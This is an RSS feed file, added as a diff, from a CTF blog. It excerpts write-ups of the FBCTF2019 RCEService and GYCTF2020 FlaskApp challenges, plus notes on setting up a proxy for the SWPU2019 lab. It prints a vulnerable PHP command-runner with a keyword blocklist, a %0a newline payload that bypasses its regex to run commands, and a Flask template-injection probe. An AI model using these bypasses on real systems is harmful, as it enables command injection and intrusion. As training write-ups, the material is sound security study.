@@ -1,0 +1,48 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>flask on wh1sper</title>
+    <link>https://anthem-whisper.github.io/tags/flask/</link>
+    <description>Recent content in flask on wh1sper</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 23 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/flask/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>BUUOJ刷题记录(3)</title>
+      <link>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</link>
+      <pubDate>Wed, 23 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/</guid>
+      <description>[FBCTF2019]RCEService 考点：%0a绕过正则匹配，绝对路径调用系统命令
+要求用json传入cmd参数RCE，但是只给了ls命令其他的都不给
+比赛的时候应该是给了源码：
+&amp;lt;?phpputenv(&#39;PATH=/home/rceservice/jail&#39;);if (isset($_REQUEST[&#39;cmd&#39;])) {$json = $_REQUEST[&#39;cmd&#39;];if (!is_string($json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} elseif (preg_match(&#39;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#39;, $json)) {echo &#39;Hacking attempt detected&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;} else {echo &#39;Attempting to run command:&amp;amp;lt;br/&amp;amp;gt;&#39;;$cmd = json_decode($json, true)[&#39;cmd&#39;];if ($cmd !== NULL) {system($cmd);} else {echo &#39;Invalid input&#39;;}echo &#39;&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;&#39;;}}?&amp;gt;正则匹配的时候没有用m修饰符(换行匹配)，所以我们可以用%0a来绕过
+然后他设置了PATH=/home/rceservice/jail，这个目录下只有ls一个命令，想要调用其他系统命令我们还要传入绝对路径，比如/bin/cat。
+flag在PATH的上级目录。
+?cmd={%0A&amp;quot;cmd&amp;quot;:&amp;quot;/bin/cat /home/rceservice/flag&amp;quot;%0A}[GYCTF2020]FlaskApp 考点：flaskSSTI、pin码
+referer：https://blog.csdn.net/Alexhcf/article/details/108400293
+从base64解码发现SSTI 题目最开始给了两个页面，一个是base64加密、一个是base64解密
+在base64解密的页面如果解密出现错误的话，会开启debug
+而且在base64解密的页面发现了模板注入，传入{{config}}的base64编码会看到以下界面：</description>
+    </item>
+    
+    <item>
+      <title>SWPU2019 复现</title>
+      <link>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</guid>
+      <description>Web2 考点：redis弱口令，python反序列化
+BUU上面的环境需要 Shadowsocks 代理才能访问，配置这个都搞了半天（tcl
+下载配置shadowsocks sudo apt-get install shadowsocks连接代理 sslocal -s node3.buuoj.cn -p 11111 -k 123456报错：AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup
+报错参考：https://www.jianshu.com/p/3f874d5aac54
+在Python2.7中的openssl文件中,下面这个函数没有定义,具体就是这个:
+EVP_CIPHER_CTX_cleanup更深层的是是由于在openssl1.1.0版本中，废弃了 EVP_CIPHER_CTX_cleanup 函数,要用这个函数 EVP_CIPHER_CTX_reset() 代替;
+直接 vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py 打开文件，全局搜索关键字替换即可；
+kali下编译安装proxychains4 编译安装 git clone https://github.com/rofl0r/proxychains-ng.git # downloadcd proxychains-ng./configuresudo make sudo make installcp ./src/proxychains.conf /etc/proxychains.conf # config file用proxychains做正向代理 vim /etc/proxychains.conf添加一行：socks5 127.0.0.1 1080（具体取决于你的ss配置的端口）
+不过我这里需要注释掉原来的那一行 socks4 127.0.0.1 9050
+命令行访问内网 proxychains4 ping web 只需在前面加 proxychains4 就行了</description>
+    </item>
+    
+  </channel>
+</rss>
